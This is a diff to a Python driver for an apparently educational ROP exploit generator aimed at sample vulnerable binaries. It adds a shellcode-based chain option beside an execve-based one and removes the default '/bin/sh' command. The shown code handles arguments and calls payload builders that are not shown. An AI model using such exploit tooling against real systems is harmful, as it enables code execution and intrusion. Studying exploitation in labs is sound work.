@@ -1,9 +1,12 @@
 #!/usr/bin/python3
 
+from Shellcode_Chain_Generator import generate_shellcode_chain
 from PaddingFinder.padding_finder import getPaddingLength
 from Function_Extractor import extract_functions
 from Execve_Chain_Generator import generate_execve_chain
 
+
+import sys
 import argparse
 import subprocess
 from pathlib import Path
@@ -13,9 +16,10 @@ parser = argparse.ArgumentParser(
     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
 )
 parser.add_argument("-p", "--program", default=Path("Examples/Vuln3/Vuln3-32/vuln3-32"))
-parser.add_argument("--command", default="/bin/sh")
-parser.add_argument("--envp", default="")
 parser.add_argument("--ROPgadget-path", default=Path("/usr/local/bin/ROPgadget"))
+parser.add_argument("--command", default=None)
+parser.add_argument("--envp", default="")
+parser.add_argument("--shellcode", default=None)
 
 parser.add_argument("--out-rop-path", default=None)
 parser.add_argument("--padding", default=None)
@@ -24,6 +28,10 @@ parser.add_argument("--padding", default=None)
 def main(args):
 
     # Check command line arguments are valid
+
+    if (args.shellcode is None) and (args.command is None):
+        print("Invalid arguments. Must provide either a command to execute with execve (--command) or a path to shellcode (--shellcode).")
+        sys.exit()
 
     # Get padding
 
@@ -55,9 +63,14 @@ def main(args):
 
     # Generate exploit (Execve_Command OR Shell_Code)
 
-    print("Generating execve based exploit...")
-    exploit_path = generate_execve_chain(args.padding, data_address, args.command, args.envp)
-    print("Exploit generated!")
+    if args.command is not None:
+        print("Generating execve based exploit...")
+        exploit_path = generate_execve_chain(args.padding, data_address, args.command, args.envp)
+        print("Exploit generated!")
+    elif args.shellcode is not None:
+        print("Generating shellcode based exploit...")
+        exploit_path = generate_shellcode_chain(args.padding, args.out_rop_path, args.shellcode)
+        print("Exploit generated!")
 
     # Run the program with the exploit
 
